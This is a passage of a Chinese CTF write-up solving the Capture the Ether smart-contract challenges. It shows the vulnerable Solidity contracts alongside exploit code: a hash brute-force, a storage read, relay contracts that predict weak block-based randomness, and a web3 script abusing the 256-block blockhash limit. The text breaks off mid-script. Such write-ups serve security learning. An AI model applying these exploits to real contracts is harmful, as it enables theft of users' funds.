require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=jgJPSjt1L1M">Guessing Games</a>.</p><p><strong>解题</strong></p><p>让我猜 <code>answer</code> 的值是多少， 如果猜对则 <code>tansfer</code> , 代码里的 <code>answer</code> 是写死的 42 ，那么猜 42 即可 。然后代码中要求 <code>msg.value</code>  要求要一个 <code>1 ether</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-62eea18b0be641282b2ff4dec27694cd-22b2a1.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-62eea18b0be641282b2ff4dec27694cd-22b2a1.png"></a></p><h3 id="2-Guess-the-secret-number"><a href="#2-Guess-the-secret-number" class="headerlink" title="2.  Guess the secret number"></a>2.  Guess the secret number</h3><p><strong>题目描述</strong>：</p><p>Putting the answer in the code makes things a little too easy.</p><p>This time I’ve only stored the hash of the number. Good luck reversing a cryptographic hash!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheSecretNumberChallenge &#123;</span><br><span class="line">    bytes32 answerHash &#x3D; 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function GuessTheSecretNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (keccak256(n) &#x3D;&#x3D; answerHash) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=uc6f_2nPSX8">Mr. Roboto</a>.</p><p><strong>解题</strong></p><p>要求 <code>keccak256(n) == 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</code>, n 为用户输入，且 <code>msg.value == 1 ether</code></p><p>n 的值为 uint 8 , 则范围为 0 - 256， 写一个脚本爆破下，爆破脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> Web3.keccak(i).<span class="built_in">hex</span>() == <span class="string">&#x27;0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365&#x27;</span>:</span><br><span class="line"><span class="meta">... </span>        <span class="built_in">print</span>(i)</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">break</span></span><br><span class="line"><span class="number">170</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>solidity 脚本参考 @0x9k PDF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract Test &#123;</span><br><span class="line">    bytes32 answerHash &#x3D; 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;</span><br><span class="line"></span><br><span class="line">    function guess() public returns(uint8) &#123;</span><br><span class="line">        for (uint8 n &#x3D; 0; n&lt; 255; n++)</span><br><span class="line">        if (keccak256(n) &#x3D;&#x3D; answerHash) &#123;</span><br><span class="line"></span><br><span class="line">return n; &#125;</span><br><span class="line"></span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-67a2ecc8954a228373b96eb021fe2d8a-8abc44.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-67a2ecc8954a228373b96eb021fe2d8a-8abc44.png"></a></p><blockquote><p>PS：  遇到了一个 Python3 Cryptodome 库的 keccak256 和 solidity 跑出来结果不一致的问题<br><a href="https://ethereum.stackexchange.com/questions/30931/python-and-solidity-keccak256-function-gives-different-results">Python and Solidity keccak256 function gives different results </a></p></blockquote><p><strong>参考文档</strong></p><p><a href="https://web3py.readthedocs.io/en/stable/web3.main.html">Web3 API — Web3.py 5.28.0 documentation (web3py.readthedocs.io)</a></p><h3 id="3-Guess-the-random-number"><a href="#3-Guess-the-random-number" class="headerlink" title="3.   Guess the random number"></a>3.   Guess the random number</h3><p><strong>题目描述：</strong></p><p>This time the number is generated based on a couple fairly random sources.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheRandomNumberChallenge &#123;</span><br><span class="line">    uint8 answer;</span><br><span class="line"></span><br><span class="line">    function GuessTheRandomNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=9ZkzZIUiHzs">The Random Song</a>.</p><p><strong>解题</strong></p><p>该题与上一个题的区别是， 这个题目的 answer 由 <code>uint8(keccak256(block.blockhash(block.number - 1), now));</code> 计算而得。搜了下相关 api ， 这个代码版本为 0.4.21 ：</p><ul><li><code>block.blockhash()</code> is now <code>blockhash()</code> hash of the given block when <code>blocknumber</code> is one of the 256 most recent blocks; otherwise returns zero</li><li><code>now</code> is <code>block.timestamp</code> : current block number</li><li><code>block.number</code> (<code>uint</code>): current block number</li></ul><p>由于合约的内容都是公开的，因此我们可以在合约对应的 <code>stroge</code> 里找到 number。 这里有几种方案</p><ol><li>用 solidity 写一个交互代码</li><li>用 Python 的 web3 写一个脚本</li></ol><p>我这里使用 web3 写一个交互脚本，由于web3.py 因为自身不会作为一个区块链的节点存在，因此它需要有一个节点用来存取区块链上的资料。一般来说最安全的方式应该是自己使用 geth 或者 parity 来自建节点，不过如果在不想要自建节点的状况时，可以考虑看看 infura 提供的 HTTP 节点服务。</p><p>我这里到 <a href="https://infura.io/dashboard/ethereum/d9f539bb96ba42c083d610b61d9be812/settings">Infura</a> 注册一个账号， 然后获取对应的 API Key</p><p>脚本内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">infura_url = <span class="string">&#x27;https://mainnet.infura.io/v3/[api_key]&#x27;</span></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(infura_url)) </span><br><span class="line"></span><br><span class="line">address = <span class="string">&#x27;XXXX&#x27;</span> <span class="comment"># blockchain address ， 题目部署后的地址</span></span><br><span class="line">a = web3.eth.getStorageAt(address, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p><strong>参考资料</strong></p><p><a href="https://web3py.readthedocs.io/en/stable/web3.eth.html?highlight=getStorageAt#web3.eth.Eth.getStorageAt">web3.eth API — Web3.py 5.28.0 documentation (web3py.readthedocs.io)</a><br><a href="https://betterprogramming.pub/capture-the-ether-guess-the-random-number-2ebb8c9c0347">Capture Ether: Guess the Random Number on a Smart Contract | by Tomás | Better Programming</a><br><a href="https://medium.com/@saurfang/lets-play-capture-the-ether-lotteries-part-i-4e0b40687efd">Let’s Play — Capture the Ether : Lotteries (Part I) | by Forest Fang | Medium</a><br><a href="https://developer.51cto.com/article/706745.html">通过 web3.py 用 Python 存取 Ethereum-51CTO.COM</a></p><h3 id="4-Guess-the-new-number"><a href="#4-Guess-the-new-number" class="headerlink" title="4. Guess the new number"></a>4. Guess the new number</h3><p><strong>题目描述：</strong></p><p>The number is now generated on-demand when a guess is made.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">    function GuessTheNewNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        if (n &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=Qu3aqM1BnLc">I Guess It’s Christmas Time</a>.</p><p><strong>题解：</strong></p><p>这个题目的随机数是在 guess 函数调用的时候生成的。 即题目描述中 的 <em>generated on-demand when a guess is made</em> , 因此我们没法直接获取改随机值。仔细阅读代码我们发现， <code>answer</code> 由代码 <code>uint8(keccak256( block.blockhash(block.number - 1), now));</code> 生成 。通过查阅相关资料我们发现：</p><blockquote><p><strong>block.blockhash(block.number-1)</strong></p><p>有一些合约则基于负一高度区块区块哈希来产生伪随机数，这也是有缺陷的。攻击合约只要以相同代码执行，即可以产生到同样的伪随机数。</p><p>示例：&lt; <a href="https://etherscan.io/address/0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8">https://etherscan.io/address/0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8</a>&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;Generate random number between 0 &amp; maxuint256 constant private FACTOR &#x3D;  1157920892373161954235709850086879078532699846656405640394575840079131296399;function rand(uint max) constant private returns (uint256 result)&#123;  uint256 factor &#x3D; FACTOR * 100 &#x2F; max;  uint256 lastBlockNumber &#x3D; block.number - 1;  uint256 hashVal &#x3D; uint256(block.blockhash(lastBlockNumber));  return uint256((uint256(hashVal) &#x2F; factor)) % max;&#125;</span><br></pre></td></tr></table></figure></blockquote><p>因此我们只需要写一个中继合约，通过中继合约调用目标合约的相关函数，即可。中继合约需要用到 <a href="https://docs.soliditylang.org/en/v0.8.10/contracts.html#interfaces">Interfaces)</a>  利用代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface GuessTheNewNumberSolve &#123;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberSolver &#123;</span><br><span class="line"></span><br><span class="line">    address owner;</span><br><span class="line">    function GuessTheNewNumberSolver() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function solve(address _challengeAddress) public payable &#123;</span><br><span class="line"></span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        GuessTheNewNumberSolve challenge &#x3D; GuessTheNewNumberSolve(_challengeAddress);</span><br><span class="line">        challenge.guess.value(msg.value)(answer);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner) ;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 remix 中部署该合约代码， 并调用 <code>solve</code> 函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-02-e6f7fb79074a3e22eb0581838edd3f66-efab90.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-02-e6f7fb79074a3e22eb0581838edd3f66-efab90.png"></a></p><p><strong>参考资料</strong><br><a href="https://www.freebuf.com/vuls/179173.html">以太坊智能合约中随机数预测 - FreeBuf网络安全行业门户</a><br><a href="https://medium.com/@saurfang/lets-play-capture-the-ether-lotteries-part-ii-478365775a34">Let’s Play — Capture the Ether : Lotteries (Part II) </a></p><h3 id="5-Predict-the-future"><a href="#5-Predict-the-future" class="headerlink" title="5.  Predict the future"></a>5.  Predict the future</h3><p><strong>题目描述：</strong></p><p>This time, you have to lock in your guess before the random number is generated. To give you a sporting chance, there are only ten possible answers.</p><p>Note that it is indeed possible to solve this challenge without losing any ether.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheFutureChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser &#x3D;&#x3D; 0);</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; msg.sender;</span><br><span class="line">        guess &#x3D; n;</span><br><span class="line">        settlementBlockNumber &#x3D; block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; 0;</span><br><span class="line">        if (guess &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解题：</strong></p><p>， 题目要求先通过 <code>lockInGuess</code> 下注， 然后调用 <code>settle</code> 开奖。 由于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br></pre></td></tr></table></figure><p>这部分代码的存在，我们无法直接通过预测来解决这个题目。 但是由于 <code>answer</code> 范围为 0 - 9， 我们可以先 lock 一个值， 然后当觉得时机合适的，即 <code>answer == uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</code>  的时候，我们再调用 <code>settle</code> 。</p><ol><li>首先编写一个中继合约， 合约内容要能调用 challenge 的 lock 以及<code>settle</code>， 在合约中调用 settle 前要判断下是否时机符合</li><li>编写一个 web3 脚本， 来调用中继合约的判断函数， 当 challenge 的 <code>isComplete</code> 已经被调用后， 就退出脚本</li></ol><p>PS: 编写 web3 python3 脚本所需要的 API JSON 可在 Remix 中导出。</p><p><strong>code：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">interface IGuessTheNewNumberChallenge &#123;</span><br><span class="line">    function isComplete() external view returns (bool);</span><br><span class="line">    function lockInGuess(uint8 n) external payable;</span><br><span class="line">    function settle() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GuessTheNumberSolver &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    function GuessTheNumberSolver() public &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(address _addr, uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        IGuessTheNewNumberChallenge challenge &#x3D; IGuessTheNewNumberChallenge(_addr);</span><br><span class="line">        </span><br><span class="line">        challenge.lockInGuess.value(msg.value)(n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle(address _addr, uint8 n ) public payable &#123;</span><br><span class="line">        uint8 answer &#x3D; uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">        if (answer &#x3D;&#x3D; n )&#123;</span><br><span class="line">            IGuessTheNewNumberChallenge challenge &#x3D; IGuessTheNewNumberChallenge(_addr);</span><br><span class="line">            challenge.settle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() public payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner) ;</span><br><span class="line">        owner.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-Predict-the-block-hash"><a href="#6-Predict-the-block-hash" class="headerlink" title="6.   Predict the block hash"></a>6.   Predict the block hash</h3><p><strong>题目描述：</strong></p><p>Guessing an 8-bit number is apparently too easy. This time, you need to predict the entire 256-bit block hash for a future block.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser &#x3D;&#x3D; 0);</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; msg.sender;</span><br><span class="line">        guess &#x3D; hash;</span><br><span class="line">        settlementBlockNumber &#x3D; block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer &#x3D; block.blockhash(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser &#x3D; 0;</span><br><span class="line">        if (guess &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=VbTrdj7vPGU">Get Lucky</a>.</p><p><strong>解题：</strong></p><p>根据黄皮书对 <code>BLOCKHASH </code> 的定义：只能获取最近 256 个区块的哈希，超出时返回 0</p><p>所以我们可以先猜 0 的 hash， 然后等他超过 256 个区块，再来开奖。 可以用 python3 web3直接实现利用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;&quot;</span></span><br><span class="line">wallet_addr = <span class="string">&quot;&quot;</span></span><br><span class="line">wallet_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;settle&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: 